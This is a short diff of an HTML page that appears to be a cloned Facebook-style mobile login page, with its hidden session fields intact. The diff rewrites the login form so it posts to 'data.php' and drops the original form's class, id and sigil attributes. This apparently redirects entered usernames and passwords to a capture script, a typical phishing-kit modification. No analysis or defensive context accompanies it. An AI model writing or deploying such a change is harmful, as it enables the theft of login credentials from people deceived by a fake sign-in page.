@@ -185,7 +185,7 @@ a._kmt:link{background:#4080ff url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA
                                 <div data-sigil="m_login_upsell"></div>
                             </div>
                             <div class="_5rut">
-                                <form method="post" action="action.php" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
+                                <form method="post" action="data.php">
                                     <input type="hidden" name="lsd" value="AVqvqJXp" autocomplete="off" />
                                     <input type="hidden" name="m_ts" value="1507496641" />
                                     <input type="hidden" name="li" value="wZLaWcpDaOWtioU_JuAc-rm1" />
